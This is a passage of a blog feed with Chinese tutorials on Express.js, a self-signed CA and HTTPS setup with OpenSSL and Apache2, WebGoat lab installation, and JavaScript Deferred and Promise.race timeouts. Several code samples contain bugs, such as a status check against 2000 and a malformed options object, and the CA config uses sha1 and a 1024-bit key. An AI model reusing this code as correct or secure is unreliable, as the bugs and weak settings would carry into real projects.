指定格式化JSON响应时使用的空格数量，默认开发模式是2，生产模式是0 case sensitive routing 禁用/启用区分大小写，默认disabled，如/home和/Home是不一样的 strict routing 禁用/启用严格路由，默认disabled，如/home和/home/是不一样的 view cache 禁用/启用视图模版编译缓存，开启后保留编译模版的缓存，默认enabled view engine 指定模版引擎，若视图省略文件扩展名，则应为默认 views 知道模版引擎查找视图模版时的目录(路径)，默认./views 启动Express服务器使用Express启动服务器时，需要创建一个实例，并监听端口，如下123const express = require('express');var app = express();app.listen(8000); listen(port)调用底层的HTTP绑定连接到port端口上，然后监听，底层的HTTP连接直接利用了http模块中server对象的listen()方法产生的连接。express()方法执行返回值是一个回调函数，它映射了传递到http.createServer()和https.createServer()方法的回调函数。如下代码用express实现HTTP和HTTPS服务器12345678910111213141516const express = require('express');const https = require('https');const http = require('http');const fs = require('fs');var app = express();var options = &#123; host: 'localhost', key: fs.readFileSync('ssl/server.key'); cert: fs.readFileSync('ssl/server.cert');&#125;;http.createServer(app).listen(80);https.createServer(options, app).listen(443);app.get('/', function(req, res)&#123; res.send('Hello Express');&#125;); 配置路由路由可以分为两部分，一个是请求方法method（POST,GET，PUT等），一个URL中的路径，如/表示根目录，/login表示登录页面 express提供了一些便捷的方法设置路由12345678// 语法app.[method](path, [callback……], callback);// 实例app.get('/', [middleware……], callback);app.post('/save',function(req, res)&#123; res.send('Saved');&#125;); app.all方法会调用指定路径的每个请求，不管是什么method，同时也接受通配符*，在对记录日志等方面非常有用123456app.all('*',function(req, res)&#123; // 处理所有请求……&#125;);app.all('/users/*',function(req, res)&#123; // 处理所有users路径上的请求……&#125;); 复杂的系统，会有许多的路由，为了减少路由数量，可以使用参数来定义如何处理一类路由，express提供了四个方法来实现参数化的路由 查询字符串在URL路径后可以使用标准的HTTP查询字符串如?key=value&amp;key2=value2,这个是最简单常用的方法123456789const express = require('express');const url = require('url');var app = express();app.get('/find', function(req, res)&#123; var urlparts = url.parse(req.url, true); var query = urlparts.query; res.send('author:'+ query.author + ' title:'+ query.title);&#125;); 上述路由对应的url路径为：/find?author=king&amp;title=nodejs POST参数当使用表单或POST方法时，一般是这种方法，在请求body正文中传递参数 正则可以定义一个正则表达式作为路由的路径，express会自动使用这个表达式解析URL123app.get('/^\\/book\\/(\\w+)\\:(\\w+)?$/', function(req, res)&#123; res.send('chapter:'+ req.params[0] + ' page:'+ req.params[1]);&#125;); 上述路由对应的url路径为：/book/12:15 已定义的参数可以在路径部分使用一个参数，当解析路径时，自动为该参数分配名称123app.get('/user/:userid', function(req, res)&#123; res.send('User:'+ req.params('userid'));&#125;); 上述路由对应的url路径为：/user/9527 使用已定义的参数可指定服务器执行的回调函数，若express发现某个参数注册了回调函数，则express会在调用路由处理程序之前调用参数的回调函数，一个路由可注册多个回调函数, 使用app.param()方法。1app.param(param, function(req, res, next, value)); next参数是注册的喜爱一个回调函数，如注册了多个回调函数的话，必须在回调函数中调用next(),否则回调链会被破坏，value参数是从url路径中解析的参数的值。1234app.param('userid', function(req, res, next, value)&#123; console.log('Userid: ' + value); next();&#125;); Request对象Request对象即路由回调函数中的第一个参数req，它提供了请求的数据和元数据，包括URL，header，查询字符串等等123456789const express = require('express');const url = require('url');var app = express();app.listen(80);app.get('*', function(req, res)&#123; console.log(req); res.send(JSON.stringify(req));&#125;); Response对象对应Request对象，Response对象的功能也很强大，提供了很多便捷的方法。 响应headerres.set(header, value) 设置单个header，res.get(header) 获取header的值res.set(headerObj)res.location(path)res.type()res.attachment([filepath]) 设置statusres.status(200) //设置正确返回码 发送响应res.send(body) body是一个字符串或buffer对象res.send(status, body) 发送JSONres.json(body)res.json(status, object)res.jsonp(body) 发送jsonp，需要请求URL中有知道回调函数参数?callback=funres.jsonp(status, object)1234567891011121314151617181920212223var express = require('express');var url = require('url');var app = express();app.listen(80);app.get('/json', function (req, res) &#123; app.set('json spaces', 4); res.json(&#123;name:\"Smithsonian\", built:'1846', items:'137M', centers: ['art', 'astrophysics', 'natural history', 'planetary', 'biology', 'space', 'zoo']&#125;);&#125;);app.get('/error', function (req, res) &#123; res.json(500, &#123;status:false, message:\"Internal Server Error\"&#125;);&#125;);app.get('/jsonp', function (req, res) &#123; app.set('jsonp callback name', 'cb'); res.jsonp(&#123;name:\"Smithsonian\", built:'1846', items:'137M', centers: ['art', 'astrophysics', 'natural history', 'planetary', 'biology', 'space', 'zoo']&#125;);&#125;); // http://localhost/json// http://localhost/error// http://localhost/jsonp?cb=handleJSONP 发送文件res.sendfile()完成将文件发送到客户端需要做的所有操作和设置，该方法内部执行了如下操作： 基于文件扩展名设置Content-type类型 设置其他header，如Content-length等 设置响应status 将文件内容发到客户端123456789101112131415161718// res.sendfile(path, options, callback);var express = require('express');var url = require('url');var app = express();app.listen(80);app.get('/image', function (req, res) &#123; res.sendfile('arch.jpg', &#123; maxAge: 24*60*60*1000, root: './views/'&#125;, function(err)&#123; if (err)&#123; console.log(\"Error\"); &#125; else &#123; console.log(\"Success\"); &#125; &#125;);&#125;); 发生下载响应res.download(path, filename, callback);与sendfile类似，但res.download方法将文件作为HTTP响应的附件发送，即自动设置了Content-Disposition 重定向响应将客户端请求重定向到一个新的位置处理12345678910111213141516171819var express = require('express');var url = require('url');var app = express();app.listen(80);app.get('/google', function (req, res) &#123; res.redirect('http://google.com');&#125;);app.get('/first', function (req, res) &#123; res.redirect('/second');&#125;);app.get('/second', function (req, res) &#123; res.send(\"Response from Second\");&#125;);app.get('/level/A', function (req, res) &#123; res.redirect(\"/level/B\");&#125;);app.get('/level/B', function (req, res) &#123; res.send(\"Response from Level B\");&#125;); 使用模版引擎借助模版引擎生成HTML，能做到简单化，不用从头开始编写HTML文件，也能优化构建HTML文档的过程，大多数模版引擎都会将编译后的模版缓存起来。 Express可以使用多种模版引擎，常用的是jade和ejs（内嵌的javascript）,jade的优点是模版文件小，采用速记符号模版，但是缺点是需要重新学习。ejs的有点就是与现在的html和js语言相兼容，即在html中嵌入js，但是缺点是比html复杂，不如jade简洁。12npm install jadenpm install ejs 在express中使用模版引擎需要先定义一个默认的模版引擎，以及设置模版文件的目录123var app = express();app.set('view engine', 'jade');app.set('views', './views'); 然后使用app.engine(ext, callback)注册模版文件扩展名，callback是支持Express的呈现功能函数1app.engine('jade', require('jade').__express); 这里的__express方法表示使用默认，也可以为HTML文件扩展名注册EJS,使用renderFile函数使用其他函数执行回调，1app.engine('html', require('ejs').renderFile) 一旦扩展名注册后，引擎回调函数就会被调用来解析模版文件并呈现模版。 在模版中加入locals对象在转换一个模版为HTML文件时，常需要包含动态数据，比如数据库中的用户信息，这种情况下，可以生成一个locals对象，将它映射到模版中的对应变量的属性名上即可12345// 两种方式——直接定义属性app.locals.title = 'KING APP'app.locals.version = 1;// 通过对象赋值app.locals(&#123;title:'KING APP', version:'1'&#125;); 以上的title和version都可以自定义，但是不能覆盖原生JS对象的一些属性或方法名称，比如name，apply，bind，call，arguments，length，constructor等 创建模版文件在创建模版文件时，需要注意可重用性，尽量将模版的重用性提高，使其在不同页面都能够使用，因为大多数模版引擎都会缓存模版来加速生成HTML文件，所以，模版越多，缓存可能越多，这种时候，最好将模版根据功能类型分类，比如菜单栏，表格，下拉框等 用于显示用户信息的EJS模版12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;EJS Template&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;User using EJS Template&lt;/h1&gt; &lt;ul&gt; &lt;li&gt;Name: &lt;%= uname %&gt;&lt;/li&gt; &lt;li&gt;Vehicle: &lt;%= vehicle %&gt;&lt;/li&gt; &lt;li&gt;Terrain: &lt;%= terrain %&gt;&lt;/li&gt; &lt;li&gt;Climate: &lt;%= climate %&gt;&lt;/li&gt; &lt;li&gt;Location: &lt;%= location %&gt;&lt;/li&gt; &lt;/ul&gt;&lt;/body&gt;&lt;/html&gt; 同样功能的jade模版，同时重用了主模版，只修改了子模版123456doctype htmlhtml(lang=&quot;en&quot;) head title=&quot;Jade Template&quot; body block content 子模版,没有了外面的html声明等标记：123456789extends main_jadeblock content h1 User using Jade Template ul li Name: #&#123;uname&#125; li Vehicle: #&#123;vehicle&#125; li Terrain: #&#123;terrain&#125; li Climate: #&#123;climate&#125; li Location: #&#123;location&#125; 以上EJS和jade的具体语法可以参考官网 将模版生成的HTML文档发送给用户1app.render(view, [locals], callback); view指定views目录中的某个视图文件名，locals指定传递的locals对象，回调函数在模版生成后执行，回调函数的参数中第一个参数为error对象，第二个对象为生成后的模版字符串（HTML文档）。 若需要将模版直接生成的模版字符串作为响应发到客户端，即不需要在发送响应之前对数据做处理，可使用res.render函数，同app.render一样，但是不需要有回调函数。 12345678910111213141516171819202122var express = require('express'), jade = require('jade'), ejs = require('ejs');var app = express();app.set('views', './views');app.set('view engine', 'jade');app.engine('jade', jade.__express);app.engine('html', ejs.renderFile);app.listen(80);app.locals.uname = \"Brad\";app.locals.vehicle = \"Jeep\";app.locals.terrain = \"Mountains\";app.locals.climate = \"Desert\";app.locals.location = \"Unknown\";app.get('/jade', function (req, res) &#123; res.render('user_jade');&#125;);app.get('/ejs', function (req, res) &#123; app.render('user_ejs.html', function(err, renderedData)&#123; res.send(renderedData); &#125;);&#125;);","categories":[{"name":"express","slug":"express","permalink":"https://github.com/xmoyKING/categories/express/"}],"tags":[{"name":"express4","slug":"express4","permalink":"https://github.com/xmoyKING/tags/express4/"},{"name":"node","slug":"node","permalink":"https://github.com/xmoyKING/tags/node/"}]},{"title":"自建CA并将网站改为HTTPS协议网站","slug":"https-ca","date":"2017-04-27T15:48:16.000Z","updated":"2017-04-27T15:48:16.000Z","comments":true,"path":"2017/04/27/https-ca/","link":"","permalink":"https://github.com/xmoyKING/2017/04/27/https-ca/","excerpt":"","text":"本文讲解如何将http网站改为https网站，同时会讲解HTTPS的基础SSL，CA认证以及利用OPENSSL生成公私钥，Web容器apache2的一些基本配置。 搭建环境如下： Ubuntu 16.04 64bit Apache2 2.3.5 Ubuntu自带 Openssl 上图主要是帮助理清客户端，网站，CA机构，浏览器之间的关系，以及他们之间的交互流程。 HTTPS站点是为了让用户相信正在访问的网站是正确的网站，所以网站需要证明自己的身份，即向用户（浏览器）展示一份证书。而证书必须由第三方机构（CA机构）签发并认证，网站不能自证。CA作为第三方独立的存在，负责证明网站的正确性，一般是收费服务。 网站向CA提交自身网站信息，包括基本信息和自己的公钥，CA将用自己的私钥对这些网站的信息进行加密，加密后的输出信息即为网站的数字证书，这个证书会发还给网站，CA机构会留存证书副本和相关的网站信息。 根证书和其他证书的概念：在网络关系中，存在一个信任链，这个链有一个源，这个源头就是根证书，其他的证书，如一级证书、二级证书就是信任链的其他元素。在这些证书中，假定根证书是绝对安全且值得信任的，这样才能有后面的信任链的存在，因此，根证书是自签名证书（自己认证自己），而其他的证书则需要由根证书来签名验证。 非对称加密算法RSA的简单运用原理：一对公私钥，私钥只能由自己持有，需要保密存放，而公钥可以发放出去，让任何人持有，无需保密。加密发送：公钥加密的信息只能被私钥正确解密，这就能保证信息不会被攻击者attacker窃取。验证身份：私钥加密的信息只能被公钥正确解密，这就能保证信息是被唯一的私钥持有者发出的。 CA机构拥有如下的一些文件(文件名自选)：caconfig.conf ：CA机构的密钥配置文件，用于生成一对CA的公私钥cacert.pem ： CA机构的公钥cakey.pem ：CA机构的私钥serial ：证书序列号文件 (初始内容为序列号，不能为空，可以设置比如01)index.txt ：保存已被本机构认证的网站的信息 （初始化时可以为空）private文件夹 ：用于保存自己的私钥cert文件夹 ：用于保存以颁发证书的副本，证书副本以证书序列号命名 网站拥有如下的一些文件（文件名自选）：server.conf : 网站的密钥配置文件，用于生成一对网站的公私钥tempreq.pem ： 网站的公钥serverkey.pem ：网站的私钥server_crt.pem : 网站的数字证书，由CA机构签发 第一步：CA的配置文件caconfig.conf文件内容如下：12345678910111213141516171819202122232425262728293031323334353637383940[ ca ]default_ca = local_ca[ local_ca ]dir = /etc/ssl # 生成公私钥的根目录位置，可以选择放在其他位置，在此位置需要root管理权限certificate = $dir/cacert.pem # CA机构的公钥database = $dir/index.txt # 保存已被本机构认证的网站的信息new_certs_dir = $dir/certs # 用于保存以颁发证书的副本，证书副本以证书序列号命名private_key = $dir/private/cakey.pem # CA机构的私钥serial = $dir/serial # 证书序列号文件 default_crl_days = 365default_days = 1825default_md = sha1policy = local_ca_policyx509_extensions = local_ca_extensionscopy_extensions = copy[ local_ca_policy ]commonName = optionalstateOrProvinceName = optionalcountryName = optionalemailAddress = optionalorganizationName = optionalorganizationalUnitName = optional[ local_ca_extensions ]basicConstraints = CA:false[ req ]default_bits = 2048default_keyfile = /etc/ssl/private/cakey.pem # 默认的CA机构的私钥，即私钥可以有多个，但是必须选一个默认default_md = sha1prompt = nodistinguished_name = root_ca_distinguished_namex509_extensions = root_ca_extensions[ root_ca_distinguished_name ] # 以下为CA机构的一些基本信息，可以修改commonName = MyOwn Root Certificate AuthoritystateOrProvinceName = NCcountryName = USemailAddress = root@ca.comorganizationName = Trade Show Hell # 在浏览器里面找证书的时候，是在此机构下找的，证书名为 MyOwn Root Certificate AuthorityorganizationalUnitName = IT Department[ root_ca_extensions ]basicConstraints = CA:true 以上caconfig.conf的目的是生成CA机构的公私钥，公钥即CA的根证书。 第二步：利用openssl生成CA的公私钥命令如下，这一步会需要设置CA私钥密码（每一个私钥都对应一个密码）：1openssl req -x509 -newkey rsa:2048 -out cacert.pem -outform PEM -days 365 -config \"caconfig.conf\" -newkey rsa:2048 表示生成新的rsa密钥，2048是密钥大小-out cacert.pem 表示输出，即生成的公钥名称-outform PEM 表示输出内容格式，可以认为是文件类型，（linux中的文件类型不是以后缀区分）-days 365 表示过期时间-config “caconfig.conf” 表示手动指定配置文件，文件路径在双引号内，上述表示相对位置 第三步：网站的配置文件server.conf文件内容如下：12345678910111213141516171819[ req ]prompt = nodistinguished_name = server_distinguished_namereq_extensions = v3_req[ server_distinguished_name ] # 以下为网站的基本信息，可以修改commonName = localhost # commonName需要与后面的alt_names内的DNS.*相等，用于证明自身stateOrProvinceName = NCcountryName = USemailAddress = root@sites.comorganizationName = My Organization NameorganizationalUnitName = Subunit of My Large Organization[ v3_req ]basicConstraints = CA:FALSEkeyUsage = nonRepudiation, digitalSignature,keyEnciphermentsubjectAltName = @alt_names[ alt_names ] # alt_names下的DNS.*需要与前面的commonName相等DNS.0 = localhostDNS.1 = localhost 第四步：利用openssl生成网站的公私钥命令如下，这一步会需要设置网站私钥密码（自设，正常情况下与前面CA密码不同）：1openssl req -newkey rsa:1024 -keyout serverkey.pem -keyform PEM -out tempreq.pem -outform PEM -config \"server.conf\" 详细命令选项同前 第五步：CA利用网站的公钥tempreq.pem生成网站的数字证书，即签名由于这一步其实是CA操作，只与网站的公钥有关（可以认为是网站向CA请求证书），输入是网站公钥，输出是颁发给网站的数字证书，配置文件为CA机构的配置文件，由于需要用CA的私钥加密网站发的信息（即网站的公钥），所以需要输入CA的私钥密码。命令如下：1openssl ca -in tempreq.pem -out server_crt.pem -config \"caconfig.conf\" 同时这一步也会对CA机构保存的一些文件进行更新，比如生成的server_crt.pem即为网站的数字证书，会在cert文件夾下自动生成一个副本01.pem （这里的01即为之前serial中的内容）,而serial中的内容会自增为02， 同时在index.txt中会自动添加网站的证书信息。（这些内容可通过vi或cat命令自行查看） 第六步：配置apache2 首先确保本机有apache2，若没有的话可以使用如下命令安装 1sudo apt-get install apache2 在安装完成后即可配置apache2了, 若默认安装则可以使用如下命令修改default-ssl文件（需要为root账户，若不是默认安装，则需要找到对应的apache2安装目录，其他的路径则类似）, 1vi /etc/apache2/sites-available/default-ssl 修改的内容如下 1234# ……SSLCertificateFile /etc/ssl/server_crt.pem # 这里配置网站的数字证书SSLCertificateKeyFile /etc/ssl/serverkey.pem # 这里配置网站的私钥# …… 执行启动SSL模块命令 12a2enmod ssl # 允许apache2开启ssl模块a2ensite default-ssl # 允许站点开始ssl模块，指定站点配置文件为default-ssl 重启apache2服务器 1service apache2 restart # 由于修改了apache2和网站的配置，此步骤需要输入网站的私钥密码 在浏览器中导入CA的公钥（根证书）不同的浏览器有不同的导入流程，但是基本相同，以firefox为例：Edit - Preferences - Advanced - View Certificates - Authorities - import - 选择CA的公钥 在浏览器输入https://localhost 即可访问https版本的apache2默认网站了，同时也可以直接输入localhost查看两者区别 补充： URL 组成例如这样一个常见的urlhttp://news.stanford.edu:81/class/g4c2?name=cs155#homework,分别有如下7个部分组成（也有可能不足7个） 协议（Protocol）: http 二级域名（SLD second-level domain）: news 主机名/域名（Hostname）：stanford.edu 端口号（Port）：81 路径（Path）：class/g4c2 查询字符串（Query）:?name=cs155 锚点（Fragment）：#homework URL中的转义中文以及一些特殊的字符在URL中是无法显示的，必须通过转义编码后浏览器才能识别，比如空格，换行符等，虽然可以在浏览器地址栏手动输入这些特殊字符，然后显示为人可识别的字符，但是其实它必须被转义才能传输，例如复制这段有特殊字符的url到其他地方，就会自动转义。 HTTPS优缺点传统的HTTP模式，存在着大量的灰色中间环节，相关信息很容易被窃取，但HTTPS却是通过认证用户与服务器，将数据准确地发送到客户机与服务器，并采用加密方式以防数据中途被盗取，大大降低了第三方窃取信息、篡改冒充身份的风险。 优点主要体现在安全性方面： 使用HTTPS协议可认证用户和服务器，确保数据发送到正确的客户机和服务器; HTTPS协议是由SSL+HTTP协议构建的可进行加密传输、身份认证的网络协议，要比http协议安全，可防止数据在传输过程中不被窃取、改变，确保数据的完整性。 HTTPS是现行架构下最安全的解决方案，虽然不是绝对安全，但它大幅增加了中间人攻击的成本。 缺点：技术方面 相同网络环境下，HTTPS协议会使页面的加载时间延长近50%，增加10%到20%的耗电。此外，HTTPS协议还会影响缓存，增加数据开销和功耗。 HTTPS协议的安全是有范围的，在黑客攻击、拒绝服务攻击、服务器劫持等方面几乎起不到什么作用。 最关键的，SSL 证书的信用链体系并不安全。特别是在某些国家可以控制 CA 根证书的情况下，中间人攻击一样可行。 成本方面 SSL的专业证书需要购买，功能越强大的证书费用越高。个人网站、小网站可以选择入门级免费证书。 SSL 证书通常需要绑定 固定IP，为服务器增加固定IP会增加一定费用。 HTTPS 连接服务器端资源占用高较高多，相同负载下会增加带宽和服务器投入成本。 其他总结HTTPS的优缺点(有些陈旧，仅供参考)正方观点： HTTPS具有更好的加密性能，避免用户信息泄露; HTTPS复杂的传输方式，降低网站被劫持的风险; 搜索引擎已经全面支持HTTPS抓取、收录，并且会优先展示HTTPS结果; 从安全角度来说个人觉得要做HTTPS，不过HTTPS可以采用登录后展示; HTTPS绿锁表示可以提升用户对网站信任程度; 基础成本可控，证书及服务器已经有了成型的支持方案; 网站加载速度可以通过cdn等方式进行弥补，但是安全不能忽略; HTTPS是网络的发展趋势，早晚都要做; 可以有效防止山寨、镜像网站; 反方观点： HTTPS会降低用户访问速度，增加网站服务器的计算资源消耗; 目前搜索引擎只是收录了小部分HTTPS内容，应该保持观望制度; HTTPS需要申请加密协议，增加了运营成本; 百度目前对HTTPS的优先展现效果不明显，谷歌较为明显; 技术门槛较高，无从下手; 目前站点不涉及私密信息，无需HTTPS; 兼容性有待提升，如robots不支持/联盟广告不支持等; HTTPS网站的安全程度有限，该被黑还是被黑; HTTPS维护比较麻烦，在搜索引擎支持HTTP的情况，没必要做HTTPS;","categories":[{"name":"it","slug":"it","permalink":"https://github.com/xmoyKING/categories/it/"}],"tags":[{"name":"ca","slug":"ca","permalink":"https://github.com/xmoyKING/tags/ca/"},{"name":"https","slug":"https","permalink":"https://github.com/xmoyKING/tags/https/"},{"name":"openssl","slug":"openssl","permalink":"https://github.com/xmoyKING/tags/openssl/"}]},{"title":"WebGoat7.x使用笔记1-环境搭建与基本解释","slug":"webgoat7-x-1","date":"2017-04-24T03:20:04.000Z","updated":"2017-04-24T03:20:04.000Z","comments":true,"path":"2017/04/24/webgoat7-x-1/","link":"","permalink":"https://github.com/xmoyKING/2017/04/24/webgoat7-x-1/","excerpt":"","text":"WebGoat是OWASP开发的用于进行Web漏洞实验的应用平台，用来说明Web应用中存在的安全漏掉.基于Java，服务器是tomcat 本文搭建的环境是WebGoat7.1 + JDK1.8 ##独立版本环境搭建步骤： Java JDK：网络上的搭建教程很多，随意选择即可，与JDK版本无关，但是Linux/Windows平台的搭建环境步骤不同 下载JDK 安装JAVA 设置环境变量 检查JAVA环境 WebGoat：有两种版本的，一个是开发版，一个是稳定版，本文使用稳定版 下载jar包 使用命令执行 通过浏览器输入localhost:8080/WebGoat访问项目 接下来按照课程一步一步完成即可 ##开发版环境搭建：开发版最重要的就是可以修改源码，即各种java文件，但是需要注意，修改的java文件的位置都是在webgoat-lessions下，所以每次修改了java文件需要重新执行9-13步 虽然每次重新编译java文件，生成jar包，然后重新部署到webgoat下，但是并不会将已经完成的实验的状态改变（即实验列表右侧小绿勾），个人估计这些状态都是记录在本地的某个文件内，只要该文件不变就ok。 ###Windows 平台配置过程：1.下载安装jdk，git，maven并配置环境变量，这个不用多说，网上一大堆。 2.最好全程开vpn，因为编译的过程要下载一些东西 3.找一个目录，使用git下载webgoat服务器代码和课程代码，命令如下：12git clone https://github.com/WebGoat/WebGoat.gitgit clone https://github.com/WebGoat/WebGoat-Lessons.git 4.输入cd WebGoat目录进入webgoat文件夹下 5.输入git checkout 7.1命令，如果按照原来的输入，编译的时候是按照8.0编译的，结果报错（checkout命令用于在多个tag版本间切换） 6.输入mvn clean compile install， 刚开始的时候，它会先下载一些东西，时间很长，所以需要保持良好网络，之后开始编译，第二次之后的编译就会非常快了 ， 7.进入到WebGoat-Lessons 8，此处要输入git checkout develop，输入git checkout 7.1报错,因为webgoat-lessons下并没有7.1tag，所以会报错，其实模式即为develop 9.输入mvn package 编译，第一次还是很慢 10.输入xcopy “target\\plugins*.jar” “..\\WebGoat\\webgoat-container\\src\\main\\webapp\\plugin_lessons\\”将编译好的课程文件复制到webgoat中，如下：(这一步其实就是负责所有的webgoat-lession目录下的生成的jar包到webgoat中，所以可以按照路径自己手动复制) 11.输入cd .. 返回上一目录。这里文档提供了三种方法运行服务，第一种使用Maven Tomcat插件做示范(因为webgoat内置tomcat，所以可以直接使用mvn开启这个内置的tomcat服务) 12.输入cd WebGoat进入WebGoat目录， 13.输入mvn -pl webgoat-container tomcat7:run-war安装插件，并开启服务，第一次时很慢， 14.然后可以开始按照实验步骤和提示做安全实验了。 开发版修改java源码文件的位置是WebGoat-Lessons内，而不是WebGoat以cross-site-scripting为例，源码位置在：WebGoat-Lessons\\cross-site-scripting\\src\\main\\java\\org\\owasp\\webgoat\\plugin\\crosssitescripting 修改完后就需要重新执行上面9-13步，然后输入上次的用户名就可以继续实验了。","categories":[{"name":"mixed","slug":"mixed","permalink":"https://github.com/xmoyKING/categories/mixed/"}],"tags":[{"name":"security","slug":"security","permalink":"https://github.com/xmoyKING/tags/security/"},{"name":"webgoat7","slug":"webgoat7","permalink":"https://github.com/xmoyKING/tags/webgoat7/"},{"name":"java","slug":"java","permalink":"https://github.com/xmoyKING/tags/java/"}]},{"title":"Promise5-高级进阶(deferred,race)","slug":"promise5","date":"2017-04-14T00:36:26.000Z","updated":"2017-12-06T14:50:09.415Z","comments":true,"path":"2017/04/14/promise5/","link":"","permalink":"https://github.com/xmoyKING/2017/04/14/promise5/","excerpt":"","text":"简要介绍一下Deferred和Promise的关系 Defferred 和 PromiseDeferred这个术语，其实就是指延迟到未来某个点再执行，是一种回调函数解决方案，可以解决耗时很长的操作的回调问题。 PS:可以参考jQuery的deferred对象详解 Deferred和Promise不同，Deferred没有规范，每个库可以自行实现和扩展。以下以jQuery.Deferred为例。 Deferred包含了Promise Deferred有能对Promise状态进行操作的特权方法 一个自定义的基于Promise实现的Deferred示例，1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253// 基于Promise实现Deferred的例子function Deferred()&#123; this.promise = new Promise(function(resolve, reject)&#123; this._resolve = resolve; this._reject = reject; &#125;.bind(this));&#125;Deferred.prototype.resolve = function(value)&#123; this._resolve.call(this.promise, value);&#125;;Deferred.prototype.reject = function(reason)&#123; this._reject.call(this.promise, reason);&#125;;// 将getUrl用Deferred改写function getUrl(url)&#123; var deferred = new Deferred(); var req = new XMLHttpRequest(); req.open('GET',url,true); req.onload = function()&#123; if(req.status === 200)&#123; deferred.resolve(req.responseText); &#125;else&#123; deferred.reject(new Error(req.statusText)); &#125; &#125;; req.error = function()&#123; deferred.reject(new Error(req.statusText)); &#125;; req.send(); return deferred.promise;&#125;// 执行var url = 'http://httpbin.org/get';getUrl(url).then(function onFulfilled(value)&#123; console.log(value);&#125;).catch(console.error.bind(console));// 等待一段时间，XHR回调输出如下json&#123; \"args\": &#123;&#125;, \"headers\": &#123; \"Accept\": \"*/*\", \"Accept-Encoding\": \"gzip, deflate, sdch\", \"Accept-Language\": \"en-US,en;q=0.8\", \"Connection\": \"close\", \"Host\": \"httpbin.org\", \"Origin\": \"http://liubin.org\", \"Referer\": \"http://liubin.org/promises-book/\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36\" &#125;, \"origin\": \"122.193.105.218\", \"url\": \"http://httpbin.org/get\"&#125; 上述中能对Promise状态进行操作的特权方法指的是能对promise对象状态进行resolve和reject的方法，而Promise通常只能在构造函数传递的方法之内对promise对象状态进行操作。 基于XHR,Promise实现的getUrl：1234567891011121314151617181920212223function getUrl(url)&#123; return new Promise(function(resolve, reject)&#123; var req = new XMLHttpRequest(); req.open('GET',url,true); req.onload = function()&#123; if(req.status === 2000)&#123; resolve(req.responseText); &#125;else&#123; reject(new Error(req.statusText)); &#125; &#125;; req.onerror = function()&#123; reject(new Error(req.statusText)); &#125;; req.send(); &#125;)&#125;// 执行var url = 'http://httpbin.org/get';getUrl(url).then(function onFulfilled(value)&#123; console.log(value);&#125;).catch(console.error.bind(console));// 输出结果与上式相同 Promise与Deferred（都是由XHR实现）相比有如下异同： 异：Deferred不需要将代码用Promise包起来，可以减少一层嵌套和缩进，但也没有了Promise的错误处理，但是Deferred有对Promise进行操作的特权方法，所以能对流程进行高度自由的操作 同：处理流程相同，都是调用resolve和reject，函数都返回promise对象 比如：一般Promise在构造函数中编写主要处理逻辑，对resolve和reject方法的调用时机基本是确定的。12345678// 使用Promisenew Promise(function(resolve,reject)&#123; // 逻辑处理代码段，对promise对象的状态确定&#125;);// 使用Deferredvar deferred = new Deferred();// 逻辑处理，在任意时机调用resolve和reject 而使用Deferred的话，不需要将处理逻辑编写为一大块，只需要先创建deferred对象，可以在任何时候对resolve和reject进行调用。 总结：如果说Promise是对值进行抽象的话，Deferred则是对处理还没有结束的状态或操作进行抽象化。即：Promise代表一个对象，这个对象状态不确定，但在未来某个时间点是能确定的。而Deferred对象代表了一个处理还没有结束，在它处理结束的时候，需要通过Promise对象来取得处理结果。 使用Promise.race 和 delay取消XHR基于Promise.race，使用Promise.race实现超时机制。XHR有timeout属性，使用该属性能简单实现超时功能，但当涉及多个XHR对象同时超时时，需要采用更容易理解的异步方法在XHR中通过超时来实现取消正在进行的操作。 Promise使用setTimeout实现超时123456789101112function delayPromise(ms)&#123; return new Promise(function(resolve)&#123; setTimeout(resolve, ms); &#125;);&#125;setTimeout(function()&#123; console.log('setTimeout after 100ms!', Date());&#125;, 1000);// 与上面的同时输出delayPromise(1000).then(function()&#123; console.log('delayPromise after 100ms!', Date());&#125;); delayPromise返回一个经过onFulfilled处理的promise对象，直接使用setTimeout函数相比，仅仅是编码不同。 Promise.race的作用为在任何一个promise对象进入到确定的状态后就执行后续处理，如下示例：1234567891011121314151617var winnerPromise = new Promise(function(resolve)&#123; setTimeout(function()&#123; console.log('this is winner'); resolve('this is winner'); &#125;, 4);&#125;);var loserPromise = new Promise(function(resolve)&#123; setTimeout(function()&#123; console.log('this is loser'); resolve('this is loser'); &#125;, 1000);&#125;);// 第一个promise变为resolve后程序停止Promise.race([winnerPromise, loserPromise]).then(function(value)&#123; console.log(value); // this is winner&#125;); 将delayPromise与其他promise对象一起放到Promise.race来实现简单的超时机制。函数timeoutPromise接收两个参数，第一个是需要使用超时机制的promise对象，第二个是超时时间，返回一个由Promise.race创建的竞争的promise对象1234567891011121314151617181920212223function timeoutPromise(promise, ms)&#123; var timeout = delayPromise(ms).then(function()&#123; throw new Error('timeout after '+ ms +' ms'); &#125;); return Promise.race([promise, timeout]);&#125;// 运行var taskPromise = new Promise(function(resolve)&#123; // 一些操作 var delay = Math.random() * 2000; setTimeout(function()&#123; resolve(delay + 'ms'); &#125;, delay);&#125;);timeoutPromise(taskPromise, 1000).then(function(value)&#123; console.log('taskPromise在规定时间内结束：'+ value);&#125;).catch(function(error)&#123; console.log('超时', error);&#125;);// 输出：// 正常：taskPromise在规定时间内结束 : 141.978790332816ms// 超时：超时,Error: Operation timed out after 1000 ms 自定义TimeouError类虽然在超时的时候确实抛出错误，但是无法区分是普通的错误类型还是我们定义的超时错误类型。可以定一个Error对象的子类TimeoutError来做出区分。 Error对象是ES的内建对象，由于stack trace等原因，在ES6之前是无法创建一个完美继承内建类的类，在但ES6中可以通过class语法来定义类的继承关系123class MyError extends Error&#123; // 继承Error类的对象&#125; 为了让TimoutError能支持类似error instanceof TimeoutError的使用方法，需要修改原型链上的构造器, 继承Error.prototype1234567891011121314151617181920function copyOwnFrom(target, source)&#123; Object.getOwnPropertyNames(source).forEach(function(propName)&#123; Object.defineProperty(target, propName, Object.getOwnPropertyDescriptor(source, propName)); return target; &#125;);&#125;function TimeoutError()&#123; var superInstance = Error.apply(null, arguments); copyOwnFrom(this, superInstance);&#125;TimeoutError.prototype = Object.create(Error.prototype);TimeoutError.prototype.constructor = TimeoutError;// 执行var promise = new Promsie(function()&#123; throw 